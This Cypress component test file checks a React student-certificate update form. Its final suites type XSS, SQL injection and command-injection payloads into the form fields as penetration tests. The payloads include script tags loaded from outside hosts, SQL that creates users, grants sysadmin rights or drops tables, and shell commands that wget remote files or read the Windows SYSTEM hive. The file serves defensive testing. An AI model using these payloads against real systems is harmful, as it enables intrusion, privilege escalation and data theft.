// @ts-nocheck
import { UpdateCertComp } from "./index";
import { BrowserRouter as Router } from "react-router-dom";
import { ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css"; // Since this is library's CSS, it can be global

// @ts-ignore
function testcase(id: string, name: string, gender: string, phone: string, email: string, permanent: string, location: string, status: boolean, cert_status: boolean, parseSpecialChar: boolean = true): void {
	// cy.viewport(375, 667); // Iphone SE dimension
	cy.viewport(1600, 1000); // Normal screen size of a Desktop

	// Mounting components
	cy.mount(
		<>
			<Router>
				<UpdateCertComp id={id} />
			</Router>
			<ToastContainer position="bottom-right" autoClose={5000} hideProgressBar={false} newestOnTop={false} closeOnClick rtl={false} pauseOnFocusLoss draggable pauseOnHover theme="light" />
		</>
	);
	// parse real data
	let real_name = name.value ? name.value : name;
	let real_phone = phone.value ? phone.value : phone;
	let real_email = email.value ? email.value : email;

	// Filling in the information
	cy.get('[data-ucc="name"]').clear().type(real_name, { parseSpecialCharSequences: parseSpecialChar }); // typing in name
	cy.get('[data-ucc="phone"]').clear().type(real_phone, { parseSpecialCharSequences: parseSpecialChar }); // phone number
	cy.get('[data-ucc="email"]').clear().type(real_email, { parseSpecialCharSequences: parseSpecialChar }); // typing in email

	// Gender
	cy.get("._col1_t9wsx_64 > :nth-child(3) > .MuiFormControl-root > .MuiInputBase-root > #demo-multiple-checkbox").click().get(`ul > li[data-value="${gender}"]`).click();

	// Permanent residence
	cy.get("._col2_t9wsx_72 > :nth-child(3) > .MuiFormControl-root > .MuiInputBase-root > #demo-multiple-checkbox").click().get(`ul > li[data-value="${permanent}"]`).click();

	// Location
	cy.get(":nth-child(4) > .MuiFormControl-root > .MuiInputBase-root > #demo-multiple-checkbox").click().get(`ul > li[data-value="${location}"]`).click();

	// status
	cy.get("._col1_t9wsx_64 > :nth-child(5) > .MuiFormControl-root > .MuiInputBase-root > #demo-multiple-checkbox")
		.click()
		.get(`ul > li[data-value="${status ? "Finished" : "In class"}"]`)
		.click();

	// Certificate status
	cy.get("._col2_t9wsx_72 > :nth-child(5) > .MuiFormControl-root > .MuiInputBase-root > #demo-multiple-checkbox")
		.click()
		.get(`ul > li[data-value="${cert_status ? "Finished" : "In class"}"]`)
		.click();

	// Click on "Save"
	cy.get(".MuiButton-contained").click();

	// CHeck if the toast message has succeeded
	cy.get(".Toastify__toast-body > :nth-child(2)").should("contain", `Successfully updated record with id="${id}"`);

	// Reload the page to see if the newly updated information are there
	// Mounting components
	cy.mount(
		<Router>
			<UpdateCertComp id={id} />
		</Router>
	);

	let expected_name = name.expected ? name.expected : name;
	let expected_phone = phone.expected ? phone.expected : phone;
	let expected_email = email.expected ? email.expected : email;

	// Recheck all of the information
	cy.get('[data-ucc="id"]').should("have.value", id);
	cy.get('[data-ucc="name"]').should("have.value", expected_name.trim());
	cy.get('[data-ucc="phone"]').should("have.value", expected_phone.trim());
	cy.get('[data-ucc="email"]').should("have.value", expected_email.trim());

	cy.get("._col1_t9wsx_64 > :nth-child(3) > .MuiFormControl-root > .MuiInputBase-root > #demo-multiple-checkbox").contains(gender);
	cy.get("._col2_t9wsx_72 > :nth-child(3) > .MuiFormControl-root > .MuiInputBase-root > #demo-multiple-checkbox").contains(permanent);
	cy.get(":nth-child(4) > .MuiFormControl-root > .MuiInputBase-root > #demo-multiple-checkbox").contains(location);

	cy.get("._col1_t9wsx_64 > :nth-child(5) > .MuiFormControl-root > .MuiInputBase-root > #demo-multiple-checkbox").contains(status ? "Finished" : "In class");
	cy.get("._col2_t9wsx_72 > :nth-child(5) > .MuiFormControl-root > .MuiInputBase-root > #demo-multiple-checkbox").contains(cert_status ? "Finished" : "In class");
}

// 815dd6f4-2d41-4c6c-a032-5e78a1cf065b
// 35f2f906-2a79-442e-b7d8-2f3f59c7c89c
// f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6
// 7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50
// @ts-ignore
describe("Unit testing US14 : update student certificate with expected data.", () => {
	// ----- Expected inputs ---
	// @ts-ignore
	it("Testcase 1", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Vinh", "Male", "111-111-1111", "vinh@gmail.com", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 2", () => testcase("35f2f906-2a79-442e-b7d8-2f3f59c7c89c", "Đinh Thế Vinh", "Male", "222-121-2329", "vinh@fpt.edu.vn", "Ninh Bình", "Nha Trang", false, true));
	it("Testcase 3", () => testcase("35f2f906-2a79-442e-b7d8-2f3f59c7c89c", "Hoàng Minh Tiến", "Female", "111-111-1111", "dddawd@yahoo.com", "Kon Tum", "Đà Nẵng", true, false));
	it("Testcase 4", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Marvis Dave", "Male", "111-111-1111", "dddd22222@gmail.com", "Lào Cai", "Hội An", false, false));
	it("Testcase 5", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Tikoto Kanaji", "Others", "111-111-1111", "trunghdad@fpt.edu.vn", "Huế", "Hồ Chí Minh", false, true));
	it("Testcase 6", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Muhammad", "Male", "111-111-1111", "ddwav11223@greenwich.edu.uk", "Hà Tĩnh", "Hà Tĩnh", true, false));
	it("Testcase 7", () => testcase("35f2f906-2a79-442e-b7d8-2f3f59c7c89c", "Vinh Đinh", "Female", "111-111-1111", "hcmvinhtester111@gmail.com", "Hà Nội", "Điện Biên Phủ", true, true));
	it("Testcase 8", () => testcase("35f2f906-2a79-442e-b7d8-2f3f59c7c89c", "Huyền Lâm Tiến", "Others", "111-111-1111", "huyenlam123@hotmail.com", "Hồ Chí Minh", "Bà Rịa", true, true));
	it("Testcase 9", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Hoàng Trần Minh Tâm", "Female", "111-111-1111", "hoangtrantk2k2@gmail.com", "Bạc Liêu", "Hà Nội", false, false));

	it("Testcase 10", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Hoàng Trần Minh Tâm", "Female", "711-993-2222", "email123@gmail.com", "Hồ Chí Minh", "Hà Nội", true, false));
	it("Testcase 11", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Hoàng Thế Vinh", "Male", "771-811-3333", "em111@gmail.com", "Hà Nội", "Hà Nội", true, true));
	it("Testcase 12", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Hoàng Trần Minh Tâm", "Others", "821-121-8080", "eml123@gmail.com", "Vĩnh Phúc", "Ninh Bình", false, false));
	it("Testcase 13", () => testcase("7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50", "Ellisabeth Walker", "Female", "999-411-9090", "emai1@gmail.com", "Quảng Ngãi", "Lào Cai", true, true));
	it("Testcase 14", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Jossie Johnson", "Others", "920-511-1020", "email112321@gmail.com", "Bạc Liêu", "Hồ Chí Minh", false, true));
	it("Testcase 15", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Hoàng Tiến Dũng", "Male", "111-111-1111", "email12344@gmail.com", "Vũng Tàu", "Vĩnh Yên", true, false));

	it("Testcase 16", () => testcase("7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50", "John Doe", "Male", "222-222-2222", "john.doe@example.com", "Hà Nội", "Hồ Chí Minh", false, true));
	it("Testcase 17", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Nguyễn Văn A", "Male", "333-333-3333", "nguyenvana@example.com", "Đà Nẵng", "Huế", true, false));
	it("Testcase 18", () => testcase("7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50", "山田 太郎", "Male", "444-444-4444", "yamadataro@example.com", "Cao Bằng", "Huế", false, true));
	it("Testcase 19", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Phạm Thị Bích", "Female", "555-555-5555", "phamthibich@example.com", "Huế", "Đà Nẵng", true, false));
	it("Testcase 20", () => testcase("7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50", "Jane Smith", "Female", "666-666-6666", "jane.smith@example.com", "Hồ Chí Minh", "Hà Nội", false, true));
	it("Testcase 21", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "田中 花子", "Female", "777-777-7777", "tanakahanako@example.com", "Hải Phòng", "Phan Rang–Tháp Chàm", true, false));
	it("Testcase 22", () => testcase("7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50", "Nguyễn Văn B", "Male", "888-888-8888", "nguyenvanb@example.com", "Đà Nẵng", "Huế", false, true));
	it("Testcase 23", () => testcase("7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50", "Phan Thị Cẩm", "Female", "999-999-9999", "phanthicam@example.com", "Huế", "Đà Nẵng", true, false));
	it("Testcase 24", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Suzuki Taro", "Male", "000-000-0000", "suzukitaro@example.com", "Quy Nhơn", "Việt Trì", false, true));
	it("Testcase 25", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Trần Văn C", "Male", "123-456-7890", "tranvanc@example.com", "Đà Nẵng", "Huế", true, false));
	it("Testcase 26", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Mary Johnson", "Female", "234-567-8901", "mary.johnson@example.com", "Hồ Chí Minh", "Hà Nội", false, true));
	it("Testcase 27", () => testcase("7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50", "小林 一郎", "Male", "345-678-9012", "kobayashiichiro@example.com", "Mỹ Tho", "Hải Phòng", true, false));
	it("Testcase 28", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Lê Thị Dung", "Female", "456-789-0123", "lethidung@example.com", "Đà Nẵng", "Huế", false, true));
	it("Testcase 29", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Smith John", "Male", "567-890-1234", "smithjohn@example.com", "Hà Nội", "Hồ Chí Minh", true, false));
	it("Testcase 30", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "鈴木 二郎", "Male", "678-901-2345", "suzukijiro@example.com", "Tuy Hòa", "Pleiku", false, true));
	it("Testcase 31", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Trần Thị Mai", "Female", "789-012-3456", "tranthimai@example.com", "Huế", "Đà Nẵng", true, false));
	it("Testcase 32", () => testcase("7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50", "Tanaka Hanako", "Female", "890-123-4567", "tanakahanako@example.com", "Hải Phòng", "Hưng Yên", false, true));
	it("Testcase 33", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Hoàng Văn E", "Male", "901-234-5678", "hoangvane@example.com", "Đà Nẵng", "Huế", true, false));
	it("Testcase 34", () => testcase("7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50", "Nguyen Van F", "Male", "012-345-6789", "nguyenvanf@example.com", "Hồ Chí Minh", "Hà Nội", false, true));
	it("Testcase 35", () => testcase("35f2f906-2a79-442e-b7d8-2f3f59c7c89c", "Yamada Ichiro", "Male", "123-456-7890", "yamadaichiro@example.com", "Tuy Hòa", "Tuy Hòa", true, false));
	it("Testcase 36", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Nguyễn Thị Hằng", "Female", "234-567-8901", "nguyenthihang@example.com", "Đà Nẵng", "Huế", false, true));
	it("Testcase 37", () => testcase("35f2f906-2a79-442e-b7d8-2f3f59c7c89c", "Yamamoto Tetsuya", "Male", "345-678-9012", "yamamototetsuya@example.com", "Huế", "Đà Nẵng", true, false));
	it("Testcase 38", () => testcase("35f2f906-2a79-442e-b7d8-2f3f59c7c89c", "Trương Văn I", "Male", "456-789-0123", "truongvani@example.com", "Cao Bằng", "Pleiku", false, true));
	it("Testcase 39", () => testcase("7a3e4b3c-5201-45fc-bb7d-18ab7e26cc50", "Sato Yuki", "Female", "567-890-1234", "satoyuki@example.com", "Hưng Yên", "Hải Phòng", true, false));
	it("Testcase 40", () => testcase("815dd6f4-2d41-4c6c-a032-5e78a1cf065b", "Nguyen Thi Lan", "Female", "678-901-2345", "nguyenthilan@example.com", "Đà Nẵng", "Huế", false, true));
});

// @ts-ignore
describe("Unit testing US14 : update student certificate with unexpected data ", () => {
	// ---- Unexpected data ---
	it("Testcase 1", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "duaduawgd66527287^%@^$@#%$", "Male", "#########", "weirdemail", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 2", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "<</script>", "Male", "phone number", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 3", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "John_Doe_123", "Male", "phone number", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 4", () =>
		testcase(
			"f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6",
			{
				value: "Account with \n Newline",
				expected: "Account with  Newline",
			},
			"Male",
			"phone number",
			"email",
			"Hải Phòng",
			"Hồ Chí Minh",
			true,
			true
		));
	it("Testcase 5", () =>
		testcase(
			"f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6",
			{
				value: "Account with \t Tab",
				expected: "Account with 	 Tab",
			},
			"Male",
			"phone number",
			"email",
			"Hải Phòng",
			"Hồ Chí Minh",
			true,
			true
		));
	it("Testcase 6", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "12345", "Male", "phone number", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 7", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "!@#$%^&*()", "Male", "phone number", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 8", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Account with emoji 😀", "Male", "phone number", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 9", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Account with special characters %$#@!", "Male", "phone number", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 10", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "John.Doe@example.com a\b\b\b\b", "Male", "phone number", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 11", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "!@#$%^&*()!@#$%^&*()!@#$%^&*(", "Male", "<script>alert('Hello')</>", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 12", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "awdawd awdawd", "Male", "John_Doe_123", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 13", () =>
		testcase(
			"f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6",
			"000-0000-000",
			"Male",
			{
				value: "Account with \n Newline",
				expected: "Account with  Newline",
			},
			"email",
			"Hải Phòng",
			"Hồ Chí Minh",
			true,
			true
		));
	it("Testcase 14", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "028-9166-310", "Male", "Account with \t Tab", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 15", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "000-000-00000", "Male", "12345", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 16", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "111-1111-111", "Male", "!@#$%^&*()", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 17", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "111:111:111", "Male", "Account with emoji 😀", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 18", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "phone number", "Male", "Account with special characters %$#@!", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 19", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "awd 00000", "Male", "John.Doe@example.com", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 20", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "000 - 0000 - 000", "Male", "email", "<script>alert('Hello')</script>", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 21", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "phone number", "Male", "email", "John_Doe_123", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 22", () =>
		testcase(
			"f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6",
			"phone number",
			"Male",
			"email",
			{
				expected: "!@#$%^&*()_1234567890-=sdfghjkl;[1234567890-=]  Newline",
				value: "!@#$%^&*()_1234567890-=sdfghjkl;[1234567890-=] \n Newline",
			},
			"Hải Phòng",
			"Hồ Chí Minh",
			true,
			true
		));
	it("Testcase 23", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "phone number", "Male", "email", "Account with \t Tab", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 24", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "phone number", "Male", "email", "12345", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 25", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "phone number", "Male", "email", "!@#$%^&*()", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 26", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "phone number", "Male", "email", "Account with emoji 😀", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 27", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "phone number", "Male", "email", "Account with special characters %$#@!", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 28", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "phone number", "Male", "      @#$%^&*()_                              ", "John.Doe@example.com", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 29", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "phone number", "Male", "email@dddddd  .com", "                    $%^&* $%^&*( @#$%^&* #$%^&5tfsvawjdhuyawr5twdfglwuhj';[';;[';/[-po098uy7t6rsadwfygjd]]])     ", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 29", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "      wkwkwkj#$%^SYhqy89ytd5iqwfgdui3WFDU3qo27tf56i12qdtr7625e625e66 ô só đinh              ", "Male", "email@dadawdawd", "email", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase 30", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", ":::::::''''''", "Male", "oolemail@gmail.com", ":::::345678e123456789", "Hải Phòng", "Hồ Chí Minh", true, true));
});

// @ts-ignore
describe("Unit testing US14 : Pentesting ", () => {
	// XSS Testing
	it("Testcase XSS 1", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "<script>alert(1);</script>", "Male", "<h1>XSS</h1>", '<style>@keyframes x{}</style><command style="animation-name:x" onanimationstart="alert(1)"></command>', "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase XSS 2", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "<%78 onxxx=1", "Male", "%3Cx onxxx=alert(1)", "<script src=//3334957647/1>", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase XSS 3", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "<x onmouseup=alert(1)>click this!", "Male", "<script>alert(1)//", "<x contenteditable onpaste=alert(1)>paste here!", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase XSS 4", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "<script src=//brutelogic.com.br/1.js>", "Male", "<script>alert(1)<!–", '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">', "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase XSS 5", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "javascript://</title>\"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/", "Male", "<x %6Fnxxx=1", "javascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/*", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase XSS 6", () =>
		testcase(
			"f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6",
			"javascript://--></script></title></style>\"/</textarea>*/<alert()/*' onclick=alert()//>a",
			"Male",
			"data:text/html,<script>alert(0)</script>",
			"';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>",
			"Hải Phòng",
			"Hồ Chí Minh",
			true,
			true
		));
	it("Testcase XSS 7", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", '">><marquee><img src=x onerror=confirm(1)></marquee>" >', "Male", '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">', ' " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//', "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase XSS 8", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "<a href=javascript:alert(1)>click", "Male", "<x%09onxxx=1", "<x/onxxx=1", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase XSS 9", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+", "Male", '<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>', "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e", "Hải Phòng", "Hồ Chí Minh", true, true));

	// SQLi Testing
	it("Testcase SQLi 1", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "'; exec master..xp_cmdshell 'ping 10.10.1.2'--", "Male", "' union (select @@version) --", "'create user name identified by 'pass123' --", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase SQLi 2", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "'", "Male", "'", "'", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase SQLi 3", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", '"', "Male", '"', '"', "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase SQLi 3", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "' union (select NULL, (select @@version)) --", "Male", "' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --", "' union (select NULL, NULL, NULL, NULL,  (select @@version)) --", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase SQLi 4", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "' union (select NULL, NULL, (select @@version)) --", "Male", "' or 1=1 --", "' union (select NULL, NULL, NULL,  (select @@version)) --", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase SQLi 5", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "' exec sp_addsrvrolemember 'name' , 'sysadmin' --", "Male", "' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --", "' grant connect to name; grant resource to name; --", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase SQLi 6", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "'", "Male", "'create user name identified by pass123 temporary tablespace temp default tablespace users; ", "' ; drop table temp --", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase SQLi 7", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "waitfor delay '0:0:20' /*", "Male", "' waitfor delay '0:0:20' /* ", "' waitfor delay '0:0:20' --", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase SQLi 8", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", ") waitfor delay '0:0:20' --", "Male", "\" waitfor delay '0:0:20' --", "\" waitfor delay '0:0:20' /* ", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase SQLi 9", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "))) waitfor delay '0:0:20' /* ", "Male", ")) waitfor delay '0:0:20' --", ")) waitfor delay '0:0:20' /* ", "Hải Phòng", "Hồ Chí Minh", true, true));

	// Command Injection Testing
	it("Testcase Command Injection 1", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "dir", "Male", "| dir", "$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 2", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "dir C:\\Users", "Male", "&& dir C:\\Users", "& dir C:\\Users", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 3", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "; dir C:\\Users", "Male", "| dir C:\\Users", " dir C:Documents and Settings\\*", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 4", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "; dir C:\\Documents and Settings\\*", "Male", "& dir C:\\Documents and Settings\\*", "&& dir C:\\Documents and Settings*", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 5", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "& dir C:\\", "Male", "dir C:\\", "| dir C:\\Documents and Settings\\*", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 6", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "&& dir C:\\", "Male", " | dir C:\\", "; dir C:\\", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 7", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "&& dir", "Male", "&&dir", "& dir", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 8", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "$(`dir`)", "Male", ";echo%20'<script>alert(1)</script>'", "; dir", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 9", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "| net view", "Male", "&& net view", "; type %SYSTEMROOT%\\repair\\SYSTEM", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 10", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "' && whoami", "Male", "which python", "which netcat", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 11", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "; whoami", "Male", "whoami", "' || whoami", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 12", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "which wget", "Male", "&& wget https://crowdshield.com/.testing/rce_vuln.txt", "wget https://crowdshield.com/.testing/rce_vuln.txt", "Hải Phòng", "Hồ Chí Minh", true, true));
	it("Testcase Command Injection 13", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)", "Male", "type %SYSTEMROOT%\\repair\\SYSTEM", '{{ get_user_file("C:\\boot.ini") }}', "Hải Phòng", "Hồ Chí Minh", true, true, false));
	it("Testcase Command Injection 14", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "&& type %SYSTEMROOT%\\repair\\SYSTEM", "Male", "; wget https://crowdshield.com/.testing/rce_vuln.txt", "$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)", "Hải Phòng", "Hồ Chí Minh", true, true));
});

describe("Unit testing US14 : Resetting the default value ", () => {
	it("Testcase Command Injection 14", () => testcase("f3f59356-625e-47e7-9b9e-d2a8e6f2c6c6", "Đinh Thế Vinh", "Male", "088-2333-123", "vinhdtgcs200644@fpt.edu.vn", "Hải Phòng", "Hồ Chí Minh", true, true));
});
